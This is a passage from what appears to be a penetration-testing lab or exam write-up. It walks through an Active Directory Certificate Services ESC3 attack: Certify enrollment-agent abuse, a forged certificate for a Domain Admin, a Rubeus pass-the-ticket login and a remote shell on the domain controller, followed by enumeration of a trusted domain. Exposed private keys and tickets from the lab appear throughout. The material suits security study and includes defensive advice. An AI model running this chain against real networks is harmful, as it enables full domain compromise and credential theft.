2VZfpo0TyOH8A4oRdf2uytg5oxPLTnB79DVqJOinUh1s6a8x3Ixb4GbtvoJCTKye
+NnYIn0tBtJCZWLT6s/1aArZu7+PK47hTh/CysKljyinzL8JRE02OzzRqqtCmGVZ
0Tcjd/m5XV3cEZ8POmR5J4X4Og7UI+ANlgZWD/z/tTpJ9OwHRu4XW/+xIJVjLen9
/oMIqVNZAoGBAOHLm9oo4P+2AqJ3feZKPdcZstWeW42qXNXcNPxCPmoz6In8zVFm
REpuxw8lhl7HX+ubyalDvcP7qhaOf9BHLcYZDRIr4dh5XJz7J/bBixXelW/vcbYD
IS4fqV85vFICm+HkGNFhOIrvjQU0Nd8dY+rzgYWQqSTRhaBFsza8nXqjAoGBAOkZ
PKifW4tzMqxpU6Qaj4+ka3TnJP7OzIVhDvRrkehS7ecWkefcO0dbhKx3F2fCikO/
/2kzKNUEzUBBbAIX3wwBEVxCDMX0dJtLLGhYBcNUlizvi4PLQnLIsMUF/xPevTEz
nk7Ef5h6fdeIyyh7Yau7Qp8N+ItgyGPVTzKWeIZXAoGAE9Ikz0TRY4EdwBdPNP0F
arF10mzBSrFOzvMyr4Y9JmOCIULQ3zlj+0i4LqsznXRRBkS5siMhMGgSKUK/E5B8
AyzFyfeSLseQirM9cdrRk8zjP108lSa3Le5XluVhk61o865rQ04OgZu/vFo19G0H
DWPs1cW6I2JFIamcrsxl4pMCgYEA5RnN2bnOww+1RWm8MHV+lmK2zs6EOQDOWWWc
yjST0rD3bIJtY2K8zJSxoMToNy4osRAbG62Ru1Sd20Kxwpjtu6GtC21LmqB6n0tS
WTfyahpQA9ho2l9Dbwe7XdpX65Knhp1CQg61jgsOdnHXo3Eo/R3vC98yYuL78cts
rL7htL8CgYEAmb0nfpozNGWEfkXO5z8Y9esHf3uQ1DQiWBtm0Q17Px2bPbc33qPR
qiZjzK7lwAueUsmlNg55Df5jYj5TkxmhL8dFSpwSfcMB0aQLIrq9+4txK178EPb0
akSPE0iKOc/TfmsQNUUWuRSAKgTeAP7gtTIrVEvNFF4ctZXMq9XEh58=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGWTCCBUGgAwIBAgITegAAAAoEQqnL8yXDkwAAAAAACjANBgkqhkiG9w0BAQsF
ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDEUMBIGCgmSJomT8ixkARkWBHRlY2gx
GDAWBgNVBAMTD3RlY2gtdGVjaC1kYy1DQTAeFw0yNTEyMTAwNDIxMDRaFw0yNzEy
MTAwNDMxMDRaMFAxFDASBgoJkiaJk/IsZAEZFgRjb3JwMRQwEgYKCZImiZPyLGQB
GRYEdGVjaDEOMAwGA1UEAxMFVXNlcnMxEjAQBgNVBAMTCXRlY2hhZG1pbjCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM2Ykzw6NmOhP3ss0iUCzwxSDMV5
mN2DF+gLkDT1TzIeqv5akFBtDGUvcg8DNTkQSMepXJWyjHBH9jAPB8djorenCmde
kqIqphDQAPuLwmRdZQIBJSwvPZApqvyJnlTGZqk5T6+Fk+N0MUrBjhRqxHnNcwsL
tFQI19kxX4TA6ZnYRAsoIQV2LavdGZiim8V8qz+LeFTeeQat36fNm0T7z2Sgh3vu
yoxZFhS7mbpED5CdsDxLya7fO4w+un0Ky5VFP4Zw/D1PnV8OfVRCtEL7F4r3yIL+
Riioih4PuRAb4S6rD8z5eYTfxifSq/OZJUF0VhQlaKlCp8etieR+14Yd/2UCAwEA
AaOCAzQwggMwMD4GCSsGAQQBgjcVBwQxMC8GJysGAQQBgjcVCIe2x3yHsNJKhc2f
AIffj2WBjP5ggWeFjPJchbXqSAIBZAIBDTAfBgNVHSUEGDAWBgorBgEEAYI3CgME
BggrBgEFBQcDAjAOBgNVHQ8BAf8EBAMCBaAwKQYJKwYBBAGCNxUKBBwwGjAMBgor
BgEEAYI3CgMEMAoGCCsGAQUFBwMCMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcN
AwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
HQ4EFgQU1puRDkZJ4OjT1TlSDWb7sVNK7ekwHwYDVR0jBBgwFoAUF2aslaiLChnP
Ky7kywTuXBsS7ewwgcsGA1UdHwSBwzCBwDCBvaCBuqCBt4aBtGxkYXA6Ly8vQ049
dGVjaC10ZWNoLWRjLUNBLENOPXRlY2gtZGMsQ049Q0RQLENOPVB1YmxpYyUyMEtl
eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9dGVj
aCxEQz1jb3JwP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvwYIKwYBBQUHAQEEgbIwga8wgawG
CCsGAQUFBzAChoGfbGRhcDovLy9DTj10ZWNoLXRlY2gtZGMtQ0EsQ049QUlBLENO
PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
YXRpb24sREM9dGVjaCxEQz1jb3JwP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RD
bGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MC4GA1UdEQQnMCWgIwYKKwYBBAGC
NxQCA6AVDBN0ZWNoYWRtaW5AdGVjaC5jb3JwMEwGCSsGAQQBgjcZAgQ/MD2gOwYK
KwYBBAGCNxkCAaAtBCtTLTEtNS0yMS0xNjAwNTU2MjEyLTg5Njk0NzQ3MS05OTQ0
MzUxODAtNTAwMA0GCSqGSIb3DQEBCwUAA4IBAQBJhgLBYxhQN63FUaINHoVVjFha
6NbmZxPhQUaGGgjHL/HEXuV6EqL1DXGHIIgxCbtrW0XN1OobH3Pdhwb/AsYLTu0b
1iC+AlZ9f/TjcL3lG+OzcgcDa+PC5rkizO3B46BhGvfA45jDxB8OAUqANBE1hEUm
WqSjE8Z6FrqgDDyRYtlqB4PHxjuQWJKrPiypSMuZUfGDACjIjQ0Op42Axjz3SrzY
fqAJpruwsKNgy/hqDK247/GBJM5StGaRRguRnM9SgNDJzPe1KJYr67U/lySM4UAv
0eBSKSD6tsOzcdHaYA4E9XNCyiJmh/dUpzmzQYKUE8nIvvwe3UsVcneajPE8
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:18.9763837
```

- `/template:FIDOUsers` - Uses the FIDOUsers template (allows "Client Authentication" for domain logon)
- `/onbehalfof:tech\techadmin` - Requests certificate FOR techadmin (Domain Admin)
- `/enrollcert:causer.pfx` - Uses causer's enrollment agent certificate to authorize the request
- `/enrollcertpw:""` - Empty password (we didn't set one)

Repeating the steps to convert `PEM to PFX`.

```xml
PS C:\Users\studentuser\Desktop> $base64 = "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"
PS C:\Users\studentuser\Desktop> [IO.File]::WriteAllBytes("C:\Users\studentuser\Desktop\techadmin.pfx", [Convert]::FromBase64String($base64))
PS C:\Users\studentuser\Desktop> ls C:\Users\studentuser\Desktop\techadmin.pfx

    Directory: C:\Users\studentuser\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/10/2025   4:34 AM           3521 techadmin.pfx

PS C:\Users\studentuser\Desktop> 
```

`*authenticate as techadmin using the certificate!*`

```xml
PS C:\Users\studentuser\Desktop> .\Rubeus.exe asktgt /user:techadmin /certificate:techadmin.pfx /password:"" /domain:tech.corp /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=techadmin, CN=Users, DC=tech, DC=corp
[*] Building AS-REQ (w/ PKINIT preauth) for: 'tech.corp\techadmin'
[*] Using domain controller: 172.16.4.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      dGd0Gwl0ZWNoLmNvcnA=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/tech.corp
  ServiceRealm             :  TECH.CORP
  UserName                 :  techadmin (NT_PRINCIPAL)
  UserRealm                :  TECH.CORP
  StartTime                :  12/10/2025 4:36:45 AM
  EndTime                  :  12/10/2025 2:36:45 PM
  RenewTill                :  12/17/2025 4:36:45 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  nkHjDF092HX71uvdEMUgGw==
  ASREP (key)              :  BF9A6DE8487E929BB9BEF9CB5E21E3B9

PS C:\Users\studentuser\Desktop> klist

Current LogonId is 0:0xe07fd

Cached Tickets: (1)

#0>     Client: techadmin @ TECH.CORP
        Server: krbtgt/tech.corp @ TECH.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 12/10/2025 4:36:45 (local)
        End Time:   12/10/2025 14:36:45 (local)
        Renew Time: 12/17/2025 4:36:45 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\Users\studentuser\Desktop> Enter-PSSession -ComputerName tech-dc.tech.corp
[tech-dc.tech.corp]: PS C:\Users\techadmin\Documents> whoami
tech\techadmin
[tech-dc.tech.corp]: PS C:\Users\techadmin\Documents> hostname
tech-dc
```

**Why We Used techadmin for the Final Stage**

The entire purpose of the ESC3 attack chain was to escalate our privileges from a low-privileged position to Domain Admin, and techadmin is the built-in Administrator account (also known as the Domain Admin) in the tech.corp domain. When we obtained the enrollment agent certificate from the FIDO template, it gave us the powerful ability to request certificates on behalf of ANY user in the domain without needing their passwords or credentials. We specifically chose to request a certificate for techadmin because this account has the highest level of privileges in the domain - it's a member of the Domain Admins group and has unrestricted access to all domain resources, including the Domain Controller itself.

**The Final Authentication Process**

Once we had techadmin's certificate in PFX format, we used Rubeus to perform PKINIT authentication, which is a Kerberos extension that allows authentication using certificates instead of passwords. When we ran `Rubeus.exe asktgt /user:techadmin /certificate:techadmin.pfx`, Rubeus presented techadmin's certificate to the Domain Controller's Key Distribution Center (KDC) and requested a Ticket Granting Ticket (TGT). The Domain Controller validated the certificate against its Certificate Authority, confirmed that it was legitimately issued for techadmin, and granted us a TGT with all of techadmin's privileges. This TGT was then automatically injected into our current session using the `/ptt` (pass-the-ticket) functionality, effectively making our session operate as if we were logged in as techadmin.

**Domain Admin Access Achieved**

With the techadmin TGT in our session, we were able to establish a PSSession directly to the Domain Controller (tech-dc.tech.corp), which would normally only be accessible to privileged accounts. When we ran `whoami` on the Domain Controller, it confirmed we were operating as `tech\techadmin`, and when we checked the hostname, it showed `tech-dc`, proving we had successfully compromised the most critical server in the domain. This level of access allows us to perform any administrative action in the domain, including creating new Domain Admin accounts, dumping all domain credentials, modifying group policies, accessing any file on any system, and essentially maintaining persistent control over the entire tech.corp Active Directory environment. The ESC3 attack successfully transformed our initial foothold as a machine account (TECHSRV30$) into complete domain dominance through certificate abuse.

{{< figure src="image 7.png" alt="image 7" >}}

Let’s go through this attack chain, causer enrolled for the FIDO certificate

- causer had enrollment rights on the FIDO template (Certificate Request Agent)
- We used causer's credentials to request and get the FIDO certificate
- This cert gave causer the power to "sign" certificate requests on behalf of other users

`causer` used FIDO cert to request a certificate FOR techadmin

- The CA saw causer's valid FIDO signature and issued a certificate with techadmin as the subject

We authenticated AS techadmin using techadmin's certificate

- We ran Rubeus with techadmin.pfx, which authenticated as techadmin
- The certificate says "Subject: CN=techadmin" - so Kerberos gave us a TGT for `techadmin`
- We’re now techadmin because that's who the certificate was issued to.

Think of it like a power of attorney:

- causer = someone with authority to sign documents on behalf of others
- FIDO cert = the legal power of attorney document
- FIDOUsers cert = a passport/ID card
- causer used their authority to create a passport for techadmin
- We can then use techadmin's passport to log in as techadmin

causer was just the middleman - you ended up with techadmin's identity because that's what you requested in the "on behalf of" attack!

`ADCS` 

In this machine, when we look at EKU and certificate templates, which are fundamental parts of ADCS exploitation, if misconfigured low-privileged users can get these certificates. Attackers can then impersonate Domain Admins without needing passwords. It's one of the "Certified Pre-Owned" ADCS vulnerabilities (`ESC3`).
The ADCS Templates in This Exam:

1. `FIDO Template (Certificate Request Agent):`
2. `FIDOUsers Template (Target Template):`

```xml
How to Defend Against This:
Restrict Certificate Request Agent enrollment - Only trusted admins should have it
Require Manager Approval for sensitive templates
Use Authorized Signatures - Restrict which agents can sign for which users
Audit certificate issuance - Monitor for suspicious cert requests
Remove unnecessary EKUs - Don't create Certificate Request Agent templates unless absolutely needed
```

### Finance-DC

`Enumeration`

```xml
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainTrust

SourceName      : tech.corp
TargetName      : finance.corp
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection  : Bidirectional
WhenCreated     : 9/3/2025 10:18:26 AM
WhenChanged     : 12/9/2025 6:35:37 AM

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-ForestTrust
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-Forest

RootDomainSid         : S-1-5-21-1600556212-896947471-994435180
Name                  : tech.corp
Sites                 : {Default-First-Site-Name}
Domains               : {tech.corp}
GlobalCatalogs        : {tech-dc.tech.corp}
ApplicationPartitions : {DC=DomainDnsZones,DC=tech,DC=corp, DC=ForestDnsZones,DC=tech,DC=corp}
ForestModeLevel       : 7
ForestMode            : Unknown
RootDomain            : tech.corp
Schema                : CN=Schema,CN=Configuration,DC=tech,DC=corp
SchemaRoleOwner       : tech-dc.tech.corp
NamingRoleOwner       : tech-dc.tech.corp

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainController -Domain finance.corp

Forest                     :
CurrentTime                : 12/9/2025 2:17:57 PM
HighestCommittedUsn        : 28767
OSVersion                  :
Roles                      :
Domain                     : finance.corp
IPAddress                  : 172.16.3.4
SiteName                   :
SyncFromAllServersCallback :
InboundConnections         :
OutboundConnections        :
Name                       : finance-dc.finance.corp
Partitions                 :

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Domain finance.corp | Select samaccountname,description

samaccountname description
-------------- -----------
finadmin       Built-in account for administering the computer/domain
Guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainComputer -Domain finance.corp

pwdlastset                    : 12/9/2025 6:30:10 AM
logoncount                    : 83
msds-generationid             : {53, 65, 175, 231...}
serverreferencebl             : CN=finance-dc,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=financ
                                e,DC=corp
badpasswordtime               : 1/1/1601 12:00:00 AM
distinguishedname             : CN=finance-dc,OU=Domain Controllers,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 12/9/2025 6:30:18 AM
name                          : finance-dc
primarygroupid                : 516
objectsid                     : S-1-5-21-3132463012-610816204-3671931044-1000
samaccountname                : finance-dc$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 12/9/2025 6:30:18 AM
accountexpires                : NEVER
cn                            : finance-dc
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
msdfsr-computerreferencebl    : CN=finance-dc,CN=Topology,CN=Domain System
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=finance,DC=corp
objectguid                    : 9d840b48-e7c7-415d-b40c-6c1ce4653099
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 1/1/1601 12:00:00 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {9/3/2025 9:29:11 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/finance-dc.finance.corp,
                                TERMSRV/finance-dc, TERMSRV/finance-dc.finance.corp,
                                ldap/finance-dc.finance.corp/ForestDnsZones.finance.corp...}
usncreated                    : 12293
usercertificate               : {48, 130, 6, 88...}
memberof                      : {CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=finance,DC=corp, CN=Cert
                                Publishers,CN=Users,DC=finance,DC=corp}
lastlogon                     : 12/9/2025 6:30:39 AM
badpwdcount                   : 0
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 9/3/2025 9:29:11 AM
countrycode                   : 0
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 28691
